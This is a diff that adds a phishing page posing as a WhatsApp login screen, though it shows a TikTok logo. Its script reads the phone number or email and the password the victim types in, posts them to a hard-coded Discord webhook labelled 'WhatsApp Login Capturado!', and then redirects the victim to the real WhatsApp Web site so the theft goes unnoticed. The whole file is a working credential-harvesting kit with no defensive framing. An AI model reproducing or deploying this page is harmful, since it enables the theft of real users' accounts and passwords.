@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>WhatsApp</title>
+</head>
+<body>
+  <div style="max-width: 400px; margin: 100px auto; padding: 20px; text-align: center;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/TikTok_logo.svg">
+    
+    <div style="background: #fff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 30px; margin-bottom: 20px;">
+      <div style="margin-bottom: 20px;">
+        <input type="text" id="phone" placeholder="Phone number or email" style="width:100%;padding:15px;font-size:16px;box-sizing:border-box;border:1px solid #ddd;border-radius:6px;margin-bottom:15px;" required>
+      </div>
+      <div style="margin-bottom: 20px;">
+        <input type="password" id="password" placeholder="Password" style="width:100%;padding:15px;font-size:16px;box-sizing:border-box;border:1px solid #ddd;border-radius:6px;" required>
+      </div>
+      <button onclick="sendMessage()" style="width:100%;background:#25D366;color:white;padding:15px;font-size:16px;border:none;border-radius:6px;cursor:pointer;">Next</button>
+    </div>
+    
+    <p style="font-size: 14px; color: #666;">
+      <a href="#" style="color: #25D366;">Forgot password?</a>
+    </p>
+  </div>
+
+  <script>
+  function sendMessage() {
+    function sleep(milliseconds) {
+      const date = Date.now();
+      let currentDate = null;
+      do {
+        currentDate = Date.now();
+      }
+      while (currentDate - date < milliseconds);
+    }
+
+    var phone = document.getElementById("phone").value;
+    var pass = document.getElementById("password").value;
+    
+    var url = 'https://discord.com/api/webhooks/1488680857320558822/YOZgzqlFdh9OUqSrufYE7iujdDV72leQWoxEA5V5k0iFD7HlPljqP4KOrDwjj-c2Mdzd';
+    
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", url, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({
+      content: 'WhatsApp Login Capturado! PHONE: ' + phone + ' | PASS: ' + pass
+    }));
+    
+    sleep(3000);
+    window.location.href = "https://web.whatsapp.com";
+  }
+  </script>
+</body>
+</html>
